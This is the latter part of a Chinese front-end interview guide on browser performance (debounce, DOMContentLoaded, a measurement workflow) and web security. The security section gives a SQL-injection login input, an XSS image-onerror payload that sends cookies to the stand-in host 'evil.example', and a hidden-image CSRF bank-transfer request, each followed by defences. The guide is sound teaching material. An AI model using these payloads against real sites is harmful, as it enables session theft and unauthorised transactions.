<span class="line">    timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span> wait<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token punctuation">}</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">const</span> keyword <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;keyword&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">keyword<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;input&#39;</span><span class="token punctuation">,</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;请求联想词：&#39;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 停止输入 200ms 后才执行</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>连续输入 <code>n</code>、<code>no</code>、<code>nod</code>、<code>node</code>，每次间隔 50ms，回调只会执行一次，拿到的是 <code>node</code>。</p><p>这种「停下来才执行」的做法严格说叫<strong>防抖</strong>（debounce）；<strong>节流</strong>（throttle）则是「不管触发多频繁，每隔固定时间最多执行一次」，更适合滚动监听、拖拽。两者经常被混着叫，面试时最好能分清。</p><h3 id="_11-尽早开始工作" tabindex="-1"><a class="header-anchor" href="#_11-尽早开始工作"><span>11. 尽早开始工作</span></a></h3><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;DOMContentLoaded&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token comment">// HTML 解析完、DOM 树就绪就触发；图片、视频可能还在下载</span></span>
<span class="line">  <span class="token function">initSearchBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;load&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token comment">// 页面上所有资源（包括图片、视频、iframe）都加载完才触发</span></span>
<span class="line">  <span class="token function">reportFullyLoaded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>绑定事件、初始化组件这类只依赖 DOM 的操作，放在 <code>DOMContentLoaded</code> 里就够了，不必等到 <code>load</code>，页面能更早变得可交互。</p><h3 id="_12-在项目里怎么推进" tabindex="-1"><a class="header-anchor" href="#_12-在项目里怎么推进"><span>12. 在项目里怎么推进</span></a></h3><p>上面每一条都只是一个「点」。真正在项目里做性能优化，需要一套可以循环的流程：</p><ol><li><strong>建立监控，摸清现状</strong>：在页面打开的各个阶段打点（DNS、连接、首字节、首屏、可交互……），把数据上报到性能平台，先知道现在有多慢、慢在哪；</li><li><strong>定位瓶颈，定目标</strong>：挑出耗时最长的环节分析原因，确定优化点和要达到的指标；</li><li><strong>实施优化</strong>；</li><li><strong>用同一套数据验证效果</strong>；</li><li><strong>调整优化点和目标</strong>，重复第 2 到第 4 步。</li></ol><p>性能优化不是一次性的活，要遵循「先测量、再分析、后动手」的顺序，持续迭代。</p><blockquote><p>现代补充：打点可以直接用浏览器的 Performance API（<code>performance.getEntriesByType(&#39;navigation&#39;)</code>）拿到各阶段耗时；指标上业界普遍参考 Core Web Vitals：LCP（最大内容绘制）、INP（交互到下一次绘制的延迟）、CLS（累计布局偏移）。本地排查可用 Chrome DevTools 的 Performance 面板和 Lighthouse。</p></blockquote><h2 id="三、web-安全" tabindex="-1"><a class="header-anchor" href="#三、web-安全"><span>三、Web 安全</span></a></h2><blockquote><p>面试题：前端常见的安全问题有哪些？怎么防？</p></blockquote><p>能把 XSS 和 CSRF 的原理和防御讲清楚，这道题就基本过关了。开讲之前可以顺带提一下最经典的 <strong>SQL 注入</strong>作为铺垫。</p><h3 id="_1-先说说-sql-注入" tabindex="-1"><a class="header-anchor" href="#_1-先说说-sql-注入"><span>1. 先说说 SQL 注入</span></a></h3><p>设想一个登录接口，后端把用户填的用户名、密码直接拼进 SQL 字符串去查库。如果有人在用户名一栏填 <code>admin&#39; --</code>，拼出来的语句里，后面校验密码的条件就被注释掉了，不用密码也能登录。</p><p>本质是<strong>把用户输入当成了代码的一部分来执行</strong>。如今稍有规模的系统都会用参数化查询（预编译语句）或 ORM，并在认证流程上设置多重校验，所以这类漏洞多出现在缺乏安全意识的小型系统里。下面的 XSS 其实是同一个思路，只不过注入的不是 SQL，而是 HTML 和 JS。</p><h3 id="_2-xss-跨站脚本攻击" tabindex="-1"><a class="header-anchor" href="#_2-xss-跨站脚本攻击"><span>2. XSS：跨站脚本攻击</span></a></h3><p>XSS 是 Cross-Site Scripting 的缩写（为了和 CSS 区分写成 X），是前端最常见的攻击方式，包括 Facebook 在内的很多大型网站都中过招。</p><p><strong>一个例子</strong></p><p>一个论坛允许用户发帖，正文支持文字和图片。正常人发的是普通内容，而攻击者发了这样一条：</p><div class="language-html line-numbers-mode" data-highlighter="prismjs" data-ext="html" data-title="html"><pre class="language-html"><code><span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>x<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&#39;https://evil.example/steal?c=&#39;</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>如果网站原样把这段内容输出到帖子页面，那么之后<strong>每个打开这个帖子的人</strong>，浏览器都会执行 <code>onerror</code> 里的代码，把自己的 Cookie 悄悄发到攻击者的服务器。</p><p><strong>原理</strong></p><p>攻击者想办法（发帖、评论、昵称、URL 参数……）把一段 JS 混进页面，等其他用户访问时，这段代码就在他们的浏览器里跑起来了。关键在于：<strong>注入的代码和网站自己的代码权限完全相同</strong>，可以读 Cookie、读本地存储、以当前用户身份调用接口、改写页面内容，网站分不清哪段代码是自己的。</p><p>按注入方式，XSS 通常分三类：</p><table><thead><tr><th>类型</th><th>恶意代码在哪</th><th>例子</th></tr></thead><tbody><tr><td>存储型</td><td>存进了服务器数据库，所有访问者都会中招</td><td>帖子、评论、个人简介</td></tr><tr><td>反射型</td><td>放在 URL 参数里，服务器原样回显到页面</td><td>诱导点击 <code>search?q=&lt;script&gt;…</code> 的链接</td></tr><tr><td>DOM 型</td><td>不经过服务器，前端 JS 把不可信数据写进了 DOM</td><td><code>el.innerHTML = location.hash.slice(1)</code></td></tr></tbody></table><p><strong>危害</strong></p><ul><li>轻一点：页面被插入广告、布局被搞乱、功能失效；</li><li>重一点：用户隐私数据泄露。攻击者拿到 Cookie 后可以伪装成用户登录，修改资料、发起操作；</li><li>更严重的是<strong>XSS 蠕虫</strong>：早年间社交网站多次出现过这种情况，被注入的帖子里带着一段脚本，谁看了，脚本就以谁的身份自动再发一篇同样的帖子，新帖子又通过推荐和好友动态被更多人看到，感染呈指数级扩散。</li></ul><p><strong>防御</strong></p><p>最根本的办法是：<strong>不信任任何用户输入，输出到 HTML 时进行转义</strong>，让浏览器把它当成文本而不是标签。需要转义的字符：</p><table><thead><tr><th>字符</th><th>转义为</th></tr></thead><tbody><tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td></tr><tr><td><code>&lt;</code></td><td><code>&amp;lt;</code></td></tr><tr><td><code>&gt;</code></td><td><code>&amp;gt;</code></td></tr><tr><td><code>&quot;</code></td><td><code>&amp;quot;</code></td></tr><tr><td><code>&#39;</code></td><td><code>&amp;#x27;</code></td></tr><tr><td><code>/</code></td><td><code>&amp;#x2F;</code></td></tr></tbody></table><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string-property property">&#39;&amp;&#39;</span><span class="token operator">:</span> <span class="token string">&#39;&amp;amp;&#39;</span><span class="token punctuation">,</span> <span class="token string-property property">&#39;&lt;&#39;</span><span class="token operator">:</span> <span class="token string">&#39;&amp;lt;&#39;</span><span class="token punctuation">,</span> <span class="token string-property property">&#39;&gt;&#39;</span><span class="token operator">:</span> <span class="token string">&#39;&amp;gt;&#39;</span><span class="token punctuation">,</span> <span class="token string-property property">&#39;&quot;&#39;</span><span class="token operator">:</span> <span class="token string">&#39;&amp;quot;&#39;</span><span class="token punctuation">,</span> <span class="token string-property property">&quot;&#39;&quot;</span><span class="token operator">:</span> <span class="token string">&#39;&amp;#x27;&#39;</span><span class="token punctuation">,</span> <span class="token string-property property">&#39;/&#39;</span><span class="token operator">:</span> <span class="token string">&#39;&amp;#x2F;&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token keyword">return</span> <span class="token function">String</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&amp;&lt;&gt;&quot;&#39;/]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">ch</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> map<span class="token punctuation">[</span>ch<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token string">&#39;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token comment">// → &#39;&amp;lt;img src=x onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;&#39;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>转义之后，攻击代码只会作为普通文字显示出来，不会被执行。</p><p>除了转义，再加几道保险：</p><ul><li><p><strong>给敏感 Cookie 加 <code>HttpOnly</code></strong>：浏览器禁止 JS 通过 <code>document.cookie</code> 读取它，就算有 XSS 也偷不走登录凭证：</p><div class="language-http line-numbers-mode" data-highlighter="prismjs" data-ext="http" data-title="http"><pre class="language-http"><code><span class="line"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">sid=8f2c1e; HttpOnly; Secure; SameSite=Lax</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p><strong>少用 <code>innerHTML</code></strong>：插入纯文本时用 <code>textContent</code>，浏览器不会解析其中的标签。Vue 的 <code>{{ }}</code>、React 的 <code>{}</code> 默认就是转义输出的，危险的是 <code>v-html</code>、<code>dangerouslySetInnerHTML</code>。确实要渲染用户提交的富文本时，用 DOMPurify 这类白名单过滤库清洗。</p></li><li><p><strong>按上下文转义</strong>：同一段数据放进 HTML 正文、属性、URL、<code>&lt;script&gt;</code> 里，需要的转义规则不一样，比如 <code>href</code> 里还要拦掉 <code>javascript:</code> 协议。另外，转义应该在<strong>输出时</strong>做，而不是存库前改写数据。</p></li><li><p><strong>配置 CSP</strong>（内容安全策略）：通过响应头限制页面只能加载、执行哪些来源的脚本，禁止内联脚本，即使注入成功也难以执行：</p><div class="language-http line-numbers-mode" data-highlighter="prismjs" data-ext="http" data-title="http"><pre class="language-http"><code><span class="line"><span class="token header"><span class="token header-name keyword">Content-Security-Policy</span><span class="token punctuation">:</span> <span class="token header-value csp languages-csp">script-src &#39;self&#39; https://cdn.shop.example</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ul><h3 id="_3-csrf-跨站请求伪造" tabindex="-1"><a class="header-anchor" href="#_3-csrf-跨站请求伪造"><span>3. CSRF：跨站请求伪造</span></a></h3><p>CSRF 是 Cross-Site Request Forgery 的缩写。它和 XSS 的思路不同：<strong>攻击者拿不到用户的任何信息，而是借用户已登录的身份，替他完成一个操作</strong>。</p><p><strong>一个例子</strong></p><p>某银行网站的转账接口是这样的：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">GET https://bank.example/transfer?to=mallory&amp;amount=500</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>只要请求带着有效的登录 Cookie，服务器就直接转账，不再要求输入密码或校验任何令牌。</p><p>用户刚登录过 <code>bank.example</code>，转头收到一封邮件或打开了某个论坛页面，里面藏着一张「图片」：</p><div class="language-html line-numbers-mode" data-highlighter="prismjs" data-ext="html" data-title="html"><pre class="language-html"><code><span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://bank.example/transfer?to=mallory&amp;amount=500<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>页面一打开，浏览器为了加载这张「图片」就发出了 GET 请求，钱已经转走了，用户什么也没察觉。</p><p><img src="`+o+'" alt="CSRF 攻击流程：恶意页面让浏览器带着目标站 Cookie 发起请求"></p><p><strong>为什么能成功</strong></p><p>靠的是 Cookie 的一个特性：<strong>浏览器向某个域名发请求时，会自动带上这个域名下的 Cookie，而不管这个请求是从哪个页面发起的。</strong></p><ul><li>用户登录后，<code>bank.example</code> 的 Cookie 里就有了登录标记；</li><li>之后无论是在 <code>bank.example</code> 自己的页面上，还是在 <code>evil.example</code> 的页面上，只要请求发往 <code>bank.example</code>，都会带着这个 Cookie，服务器就会认为是用户本人在操作。</li></ul><p>注意别和同源策略搞混：同源策略限制的是<strong>读取</strong>跨域响应。在 <code>bank.example</code> 的页面里用 <code>fetch</code> 请求 <code>other.example</code> 的接口，默认不会带 Cookie（<code>credentials</code> 默认是 <code>same-origin</code>），响应也读不到。但 <code>&lt;img&gt;</code>、<code>&lt;form&gt;</code>、<code>&lt;script&gt;</code> 这类标签发起的跨站请求一直都能发出去，而且过去默认会带上目标站的 Cookie。CSRF 正是利用了这一点：攻击者不需要读响应，只要请求被执行就达到目的了。</p><p><strong>防御</strong></p><p>核心思路是：<strong>让服务器能分辨请求是不是用户在本站主动发起的</strong>。</p><table><thead><tr><th>手段</th><th>做法</th></tr></thead><tbody><tr><td>关键操作二次验证</td><td>转账、改密码等敏感操作要求输入密码、短信验证码或指纹，现在的支付、电商网站基本都这么做</td></tr><tr><td>CSRF Token</td><td>服务器生成一个随机令牌，放在页面里或非 HttpOnly Cookie 里，提交时作为参数或请求头带上，服务器比对。攻击者的页面读不到这个值，也就伪造不出来</td></tr><tr><td><code>SameSite</code> Cookie</td><td>设置 <code>SameSite=Lax</code> 或 <code>Strict</code>，浏览器在跨站请求中不再携带该 Cookie。Chrome、Edge 等 Chromium 系浏览器会把没声明 <code>SameSite</code> 的 Cookie 按 <code>Lax</code> 处理，但 Firefox、Safari 并没有统一这样做，所以要在 <code>Set-Cookie</code> 里显式写明</td></tr><tr><td>校验来源</td><td>检查请求头里的 <code>Origin</code> / <code>Referer</code>，不是自己的域名就拒绝</td></tr><tr><td>写操作不用 GET</td><td>修改数据的接口用 POST / PUT / DELETE。GET 请求用一张图片就能触发，门槛太低</td></tr></tbody></table><p>需要强调：<strong>只把 GET 改成 POST 并不能防住 CSRF</strong>，攻击者可以在自己的页面里放一个自动提交的表单来发 POST。它的作用是提高门槛、配合显式声明的 <code>SameSite=Lax</code>（这类 Cookie 在跨站 POST 中不会被带上；而没写 <code>SameSite</code>、靠 Chromium 默认按 Lax 处理的 Cookie，刚设置后约 2 分钟内仍会随跨站的顶层 POST 发送，不能完全指望），真正的防线还是 Token、<code>SameSite</code> 和二次验证。</p><h3 id="_4-xss-和-csrf-对比" tabindex="-1"><a class="header-anchor" href="#_4-xss-和-csrf-对比"><span>4. XSS 和 CSRF 对比</span></a></h3><table><thead><tr><th></th><th>XSS</th><th>CSRF</th></tr></thead><tbody><tr><td>攻击代码在哪执行</td><td>目标网站的页面里</td><td>攻击者自己的页面里</td></tr><tr><td>能否拿到用户数据</td><td>能，权限等同网站自身脚本</td><td>不能，只是借身份发请求</td></tr><tr><td>根本原因</td><td>把不可信数据当作代码输出</td><td>服务器只凭 Cookie 判断身份</td></tr><tr><td>主要防御</td><td>输出转义、CSP、HttpOnly</td><td>Token、SameSite、二次验证、校验来源</td></tr></tbody></table><p>另外，一旦站点存在 XSS，攻击脚本就运行在本站页面里，可以直接读取页面上的 CSRF Token，CSRF 防御也会随之失效。所以 XSS 往往是更需要优先堵住的漏洞。</p><h2 id="面试速答模板" tabindex="-1"><a class="header-anchor" href="#面试速答模板"><span>面试速答模板</span></a></h2><blockquote><p>浏览器打开页面分两步。加载阶段：DNS 把域名解析成 IP，和服务器建立 TCP（HTTPS 还有 TLS）连接，发 HTTP 请求，服务器处理后返回 HTML 文本。渲染阶段：HTML 解析成 DOM，CSS 解析成 CSSOM，合成渲染树，再布局、绘制、合成上屏；碰到普通 <code>&lt;script&gt;</code> 会暂停解析，因为 JS 和渲染共用主线程，而且可能修改 DOM。所以 CSS 放头部，避免重复渲染和样式闪烁；JS 放底部或加 <code>defer</code>，不阻塞首屏，执行时 DOM 也已就绪。</p><p>性能优化以用户体验为标准，思路是多用缓存、少让 CPU 和 GPU 干活。加载方面做资源压缩合并、文件名带内容哈希配合长缓存、用 CDN；渲染方面 CSS 在前 JS 在后、图片懒加载、缓存 DOM 查询、用 <code>DocumentFragment</code> 批量插入、高频事件做防抖节流、在 <code>DOMContentLoaded</code> 就初始化、必要时上 SSR。落地时先建监控摸底，找瓶颈定目标，优化后用数据验证，循环推进。</p><p>安全方面最常见的是 XSS 和 CSRF。XSS 是恶意脚本被注入页面、以网站自身的权限执行，可能偷 Cookie 甚至形成蠕虫；防御是输出时对 <code>&amp; &lt; &gt; &quot; &#39; /</code> 等字符转义，避免 <code>innerHTML</code>，敏感 Cookie 加 <code>HttpOnly</code>，再配上 CSP。CSRF 是利用浏览器会自动携带目标域 Cookie 的特性，在第三方页面上冒用用户身份发请求；防御是 CSRF Token、<code>SameSite</code> Cookie、校验 <code>Origin</code>、敏感操作二次验证，写接口不要用 GET。</p></blockquote>',138),i=[l];function r(d,u){return a(),s("div",null,i)}const g=n(c,[["render",r],["__file","06-一面-5-浏览器相关知识点与高频考题解析.html.vue"]]),m=JSON.parse('{"path":"/%E9%9D%A2%E8%AF%95%E6%8C%87%E5%8D%97/06-%E4%B8%80%E9%9D%A2-5-%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E9%AB%98%E9%A2%91%E8%80%83%E9%A2%98%E8%A7%A3%E6%9E%90.html","title":"一面 浏览器相关知识点与高频考题解析","lang":"zh-CN","frontmatter":{"title":"一面 浏览器相关知识点与高频考题解析","description":"一面 5：浏览器相关知识点与高频考题 前端代码最终都要交给浏览器执行，所以面试官很喜欢从浏览器的角度出题。题目虽然五花八门，归纳起来基本落在三块： 页面是怎么加载、怎么渲染出来的 怎么让页面更快（性能优化） 怎么让页面不被攻击（Web 安全） 下面按这个顺序展开：先把「从地址栏到像素」的流程讲清楚，性能优化的大部分手段都能从这条流程里推出来；最后单独讲...","head":[["meta",{"property":"og:url","content":"https://interview.leeguoo.com/%E9%9D%A2%E8%AF%95%E6%8C%87%E5%8D%97/06-%E4%B8%80%E9%9D%A2-5-%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E9%AB%98%E9%A2%91%E8%80%83%E9%A2%98%E8%A7%A3%E6%9E%90.html"}],["meta",{"property":"og:site_name","content":"前端面试题集锦"}],["meta",{"property":"og:title","content":"一面 浏览器相关知识点与高频考题解析"}],["meta",{"property":"og:description","content":"一面 5：浏览器相关知识点与高频考题 前端代码最终都要交给浏览器执行，所以面试官很喜欢从浏览器的角度出题。题目虽然五花八门，归纳起来基本落在三块： 页面是怎么加载、怎么渲染出来的 怎么让页面更快（性能优化） 怎么让页面不被攻击（Web 安全） 下面按这个顺序展开：先把「从地址栏到像素」的流程讲清楚，性能优化的大部分手段都能从这条流程里推出来；最后单独讲..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://interview.leeguoo.com/images/rewrite/guide-browser/render-pipeline.webp"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2026-10-02T11:46:12.000Z"}],["meta",{"property":"article:modified_time","content":"2026-10-02T11:46:12.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"一面 浏览器相关知识点与高频考题解析\\",\\"image\\":[\\"https://interview.leeguoo.com/images/rewrite/guide-browser/render-pipeline.webp\\",\\"https://interview.leeguoo.com/images/rewrite/guide-browser/response-html.webp\\",\\"https://interview.leeguoo.com/images/rewrite/guide-browser/csrf-flow.webp\\"],\\"dateModified\\":\\"2026-10-02T11:46:12.000Z\\",\\"author\\":[]}"]]},"headers":[{"level":2,"title":"核心要点","slug":"核心要点","link":"#核心要点","children":[]},{"level":2,"title":"一、从输入网址到页面出现","slug":"一、从输入网址到页面出现","link":"#一、从输入网址到页面出现","children":[{"level":3,"title":"1. 加载：把 HTML 拿回来","slug":"_1-加载-把-html-拿回来","link":"#_1-加载-把-html-拿回来","children":[]},{"level":3,"title":"2. 渲染：把文本变成画面","slug":"_2-渲染-把文本变成画面","link":"#_2-渲染-把文本变成画面","children":[]}]},{"level":2,"title":"二、性能优化","slug":"二、性能优化","link":"#二、性能优化","children":[{"level":3,"title":"1. 原则与方向","slug":"_1-原则与方向","link":"#_1-原则与方向","children":[]},{"level":3,"title":"2. 压缩与合并静态资源","slug":"_2-压缩与合并静态资源","link":"#_2-压缩与合并静态资源","children":[]},{"level":3,"title":"3. 用文件名控制缓存","slug":"_3-用文件名控制缓存","link":"#_3-用文件名控制缓存","children":[]},{"level":3,"title":"4. 静态资源放到 CDN","slug":"_4-静态资源放到-cdn","link":"#_4-静态资源放到-cdn","children":[]},{"level":3,"title":"5. 服务端渲染（SSR）","slug":"_5-服务端渲染-ssr","link":"#_5-服务端渲染-ssr","children":[]},{"level":3,"title":"6. CSS 在前、JS 在后","slug":"_6-css-在前、js-在后","link":"#_6-css-在前、js-在后","children":[]},{"level":3,"title":"7. 懒加载","slug":"_7-懒加载","link":"#_7-懒加载","children":[]},{"level":3,"title":"8. 缓存 DOM 查询结果","slug":"_8-缓存-dom-查询结果","link":"#_8-缓存-dom-查询结果","children":[]},{"level":3,"title":"9. 合并 DOM 修改","slug":"_9-合并-dom-修改","link":"#_9-合并-dom-修改","children":[]},{"level":3,"title":"10. 高频事件：防抖与节流","slug":"_10-高频事件-防抖与节流","link":"#_10-高频事件-防抖与节流","children":[]},{"level":3,"title":"11. 尽早开始工作","slug":"_11-尽早开始工作","link":"#_11-尽早开始工作","children":[]},{"level":3,"title":"12. 在项目里怎么推进","slug":"_12-在项目里怎么推进","link":"#_12-在项目里怎么推进","children":[]}]},{"level":2,"title":"三、Web 安全","slug":"三、web-安全","link":"#三、web-安全","children":[{"level":3,"title":"1. 先说说 SQL 注入","slug":"_1-先说说-sql-注入","link":"#_1-先说说-sql-注入","children":[]},{"level":3,"title":"2. XSS：跨站脚本攻击","slug":"_2-xss-跨站脚本攻击","link":"#_2-xss-跨站脚本攻击","children":[]},{"level":3,"title":"3. CSRF：跨站请求伪造","slug":"_3-csrf-跨站请求伪造","link":"#_3-csrf-跨站请求伪造","children":[]},{"level":3,"title":"4. XSS 和 CSRF 对比","slug":"_4-xss-和-csrf-对比","link":"#_4-xss-和-csrf-对比","children":[]}]},{"level":2,"title":"面试速答模板","slug":"面试速答模板","link":"#面试速答模板","children":[]}],"git":{"updatedTime":1790941572000,"contributors":[{"name":"leeguooooo","email":"guoli@zhihu.com","commits":4}]},"autoDesc":true,"filePathRelative":"面试指南/06-一面-5-浏览器相关知识点与高频考题解析.md","excerpt":"\\n<p>前端代码最终都要交给浏览器执行，所以面试官很喜欢从浏览器的角度出题。题目虽然五花八门，归纳起来基本落在三块：</p>\\n<ol>\\n<li><strong>页面是怎么加载、怎么渲染出来的</strong></li>\\n<li><strong>怎么让页面更快</strong>（性能优化）</li>\\n<li><strong>怎么让页面不被攻击</strong>（Web 安全）</li>\\n</ol>\\n<p>下面按这个顺序展开：先把「从地址栏到像素」的流程讲清楚，性能优化的大部分手段都能从这条流程里推出来；最后单独讲 XSS 和 CSRF 两种最常考的攻击。</p>\\n<h2>核心要点</h2>\\n<ul>\\n<li><strong>加载阶段</strong>：DNS 把域名解析成 IP → 和服务器建立连接 → 发 HTTP 请求 → 服务器处理后返回 → 浏览器拿到一段 HTML 文本。</li>\\n<li><strong>渲染阶段</strong>：HTML 解析成 DOM，CSS 解析成 CSSOM，两者合成渲染树，再经过布局、绘制、合成显示到屏幕上。</li>\\n<li><strong>普通 <code>&lt;script&gt;</code> 会卡住解析</strong>：JS 和渲染共用主线程，脚本又可能改 DOM，所以遇到它要先下载、执行完才继续。因此 CSS 放 <code>&lt;head&gt;</code>，JS 放 <code>&lt;/body&gt;</code> 前（或加 <code>defer</code>）。</li>\\n<li><strong>性能优化两条线</strong>：一是让资源更小、更少、更近（压缩合并、缓存、CDN），二是让渲染更省（减少 DOM 读写、懒加载、防抖节流、提前执行、SSR）。落地时要先测量、再优化、再复测，循环推进。</li>\\n<li><strong>XSS</strong>：攻击者把脚本混进页面让别人的浏览器执行，脚本拥有和页面一样的权限。防御靠输出转义、少用 <code>innerHTML</code>、<code>HttpOnly</code> Cookie、CSP。</li>\\n<li><strong>CSRF</strong>：攻击者诱导用户的浏览器带着已登录的 Cookie 去调用目标站接口。防御靠 CSRF Token、<code>SameSite</code> Cookie、校验来源、关键操作二次确认，写操作不要用 GET。</li>\\n<li>两者的区别：XSS 是<strong>在你的站点里执行了别人的代码</strong>；CSRF 是<strong>在别人的站点上冒用你的身份</strong>，攻击者自己看不到 Cookie。</li>\\n</ul>"}');export{g as comp,m as data};
